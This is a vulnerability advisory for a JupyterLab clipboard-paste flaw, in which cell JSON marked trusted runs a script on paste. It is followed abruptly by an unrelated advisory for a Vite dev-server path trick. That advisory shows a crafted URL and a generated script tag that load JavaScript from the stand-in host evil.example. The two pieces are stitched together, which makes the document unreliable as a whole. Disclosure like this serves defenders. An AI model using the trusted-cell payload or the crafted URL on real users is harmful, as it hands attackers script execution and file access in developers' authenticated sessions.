## Description

JupyterLab 4.5.0 enabled copying and pasing cells through the system clipboard. The paste path parses clipboard text as cell JSON and inserts the cells without clearing `metadata.trusted`, so a payload can declare its own output as trusted. JupyterLab does not sanitize a trusted output and evaluates the `<script>` elements it contains, so pasting the cell runs attacker's JavaScript in the JupyterLab origin. The same payload with `"trusted": false` is sanitized.

```json
[
  {
    "cell_type": "code",
    "execution_count": null,
    "source": "",
    "metadata": { "trusted": true },
    "outputs": [
      {
        "output_type": "display_data",
        "metadata": {},
        "data": { "text/html": "<script>/* runs on paste */</script>" }
      }
    ]
  }
]
```

Users are affected if all of the following are true:

- they run JupyterLab 4.5.0 through 4.6.3, or an application that bundles it such as Notebook 7.5+;
- if running 4.5.2 or newer, `useSystemClipboardForCells` is enabled - it is off by default in 4.5.2+, and always enabled on 4.5.0 and 4.5.1 with no opt-out
- they run a Paste Cells command (e.g. from context menu, command palette, shortcut) while attacker-controlled text is in the clipboard; and
- `pasteCodeCellsWithoutOutput` is off, the default, so the pasted cell keeps its outputs


### Impact

The script runs in the JupyterLab page, in the same origin and session as the authenticated user, so it can call the Jupyter Server REST API as that user: read and write any file under the server root, start a kernel and run code in it, and open a terminal where terminals are enabled. It runs on paste, without the user executing anything.

Only the output of a code cell can run a script this way. Markdown and raw cells are always sanitized, as the [trust documentation](https://jupyterlab.readthedocs.io/en/latest/user/notebook.html#trust) states.

The attacker needs no JupyterLab account and no access to the server, only the user's clipboard at the moment of the paste. A web page can replace the text you copy from it, or write the clipboard directly once you have given it permission. Both need you to click or press a key on that page first.

### Patches

JupyterLab [`v4.6.4`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.6.4) and [`v4.5.11`](https://github.com/jupyterlab/jupyterlab/releases/tag/v4.5.11) contain the patch. Cells read from the system clipboard that cannot be traced to the current window no longer carry `metadata.trusted` into the notebook, so their outputs are sanitized like any other content of unknown origin.

Users of applications that depend on JupyterLab, such as Notebook v7+, should update `jupyterlab` package too.

### Workarounds

On 4.5.2 and later, confirm that the system clipboard is not in use for cells. The setting is off by default; check Settings, Notebook, or the raw value:

```json
{
  "@jupyterlab/notebook-extension:tracker": {
    "useSystemClipboardForCells": false
  }
}
```

With that setting off, cell copy and paste use JupyterLab's in-application clipboard, which never leaves the page. The cost is that cells can no longer be copied between browser tabs or windows.

On 4.5.0 and 4.5.1 there is no such setting, and every paste reads the system clipboard and upgrade is highly recommended.

Pasting cells without their outputs also stops the script from running, at the cost of discarding outputs on every paste:

```json
{
  "@jupyterlab/notebook-extension:tracker": {
    "pasteCodeCellsWithoutOutput": true
  }
}
```

### Summary

When accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.

### Impact

Only apps that match the following conditions are affected:

- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.
- the transformed HTML contains an inline module script
- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions

### Details

[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:

```js
const url = req.originalUrl
template = await vite.transformIndexHtml(url, template)
```

For a development server at `http://localhost:5173`, an attacker can send this URL:

```text
http://localhost:5173//evil.example/payload.js?/../../package.json
```

In Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.

Chromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.

[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:

```html
<script type="module" src="//evil.example/payload.js?/../../package.json?html-proxy&index=0.js"></script>
```

The generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.

